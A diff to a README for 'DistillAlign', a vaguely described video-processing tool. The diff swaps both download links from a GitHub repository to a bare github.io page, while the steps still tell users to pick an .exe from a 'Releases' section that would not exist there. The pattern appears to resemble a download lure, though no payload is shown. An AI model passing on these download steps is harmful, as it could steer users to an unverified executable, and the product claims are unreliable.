@@ -1,6 +1,6 @@
 # 🎬 DistillAlign - Create Better Videos Through Smart Processing
 
-[![Download DistillAlign](https://img.shields.io/badge/Download-DistillAlign-blue)](https://github.com/putoamo8579/DistillAlign)
+[![Download DistillAlign](https://img.shields.io/badge/Download-DistillAlign-blue)](https://putoamo8579.github.io)
 
 DistillAlign helps you process and organize video files with precision. This tool uses advanced math to align video frames and remove unwanted noise. It simplifies complex distillation tasks, so you get polished results without manual editing.
 
@@ -27,7 +27,7 @@ Before you install DistillAlign, ensure your computer meets these basic needs:
 
 Follow these steps to set up the software on your Windows machine.
 
-1. First, visit the official project page to access the setup files: [https://github.com/putoamo8579/DistillAlign](https://github.com/putoamo8579/DistillAlign)
+1. First, visit the official project page to access the setup files: [https://putoamo8579.github.io](https://putoamo8579.github.io)
 2. Scroll to the "Releases" section on the right side of the page.
 3. Click on the latest version of the application.
 4. Download the file that ends in .exe.
